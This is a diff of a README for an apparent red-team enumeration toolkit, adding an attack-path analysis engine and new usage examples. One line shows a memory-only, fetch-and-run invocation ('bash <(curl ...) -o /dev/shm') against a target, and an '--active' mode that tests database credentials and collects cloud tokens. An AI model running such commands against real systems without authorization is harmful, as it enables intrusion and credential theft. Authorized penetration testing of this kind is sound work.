@@ -47,8 +47,9 @@ patch-aware **CVE engine** reports only CVEs the host is genuinely vulnerable to
 | [`macos/rt-macenum.sh`](macos/rt-macenum.sh) | macOS (bash) | **macOS** local privesc: SIP/TCC/Gatekeeper, admin/sudo, writable LaunchDaemons, SUID, keychains |
 | [`secrets/scan-secrets.sh`](secrets/scan-secrets.sh) | Linux (bash) | Filesystem **secrets scanner**: private keys, cloud/SaaS tokens, DB conn-strings, JWTs, password assignments, git history (values masked) |
 | [`secrets/Invoke-RTSecretScan.ps1`](secrets/Invoke-RTSecretScan.ps1) | Windows (PS) | Same secrets scanner for Windows paths |
-| [`run/run-all.sh`](run/run-all.sh) / [`run/Invoke-RTAll.ps1`](run/Invoke-RTAll.ps1) | Linux / Windows | **Orchestrators** — run every module into one folder and build the report |
+| [`run/run-all.sh`](run/run-all.sh) / [`run/Invoke-RTAll.ps1`](run/Invoke-RTAll.ps1) | Linux / Windows | **Orchestrators** — run every module into one folder, write a merged output file, build report + analysis |
 | [`tools/eg-report.py`](tools/eg-report.py) | any (Python) | Merge all `findings.json` into one **HTML report** with a phase **playbook**, **MITRE ATT&CK** tags & **remediation**; `--diff` shows what a hop unlocked |
+| [`research/eg_analyze.py`](research/eg_analyze.py) | any (Python) | **Analysis engine**: asset/permission **graph**, correlation **rules**, **attack-path** analysis, **anomaly** detection, **novelty** classification (research candidates), **HTML/JSON/SARIF/CSV** + baseline diff |
 
 Plus a **CVE detection system**: [`data/cve-db.txt`](data/cve-db.txt) (curated local-privesc/kernel CVEs) is matched by the enum scripts and reports a CVE **only when the host is genuinely vulnerable** — it consults the distro package **changelog** (and Windows patch dates) to suppress backported/patched fixes, defeating the version-only false positives that linPEAS/winPEAS produce. [`tools/update-cve-db.sh`](tools/update-cve-db.sh) / [`.ps1`](tools/update-cve-db.ps1) refresh it from the **CISA Known-Exploited-Vulnerabilities** feed.
 
@@ -100,10 +101,14 @@ chmod +x linux/rt-linenum.sh
 # memory-only on target:  bash <(curl -s http://you/rt-linenum.sh) -o /dev/shm
 ```
 
-### Run everything + one HTML report
+### Run everything + analysis (graph, attack paths, research candidates)
 ```bash
-./run/run-all.sh                            # local triage + secrets + cloud, then report
-./run/run-all.sh --net 10.0.0.0/24 --ad -d corp.local --dc 10.0.0.10 -u user -p pass
+./run/run-all.sh                            # local triage + secrets + cloud; writes merged output + report + analysis
+./run/run-all.sh --net 10.0.0.0/24 --ad -d corp.local --dc 10.0.0.10 -u user  # prompts for pw
+./run/run-all.sh --active                   # also DB cred-tests + cloud token collection
+# analyse any set of runs directly (graph/attack-paths/anomalies/novelty, 4 formats, baseline diff):
+python3 research/eg_analyze.py ./loot --graph nodes_edges.json --baseline prev-merged.json \
+        --out analysis --output-format html,json,sarif,csv
 ```
 ```powershell
 . .\run\Invoke-RTAll.ps1 ; Invoke-RTAll -Net 10.0.0.0/24 -OutDir C:\loot
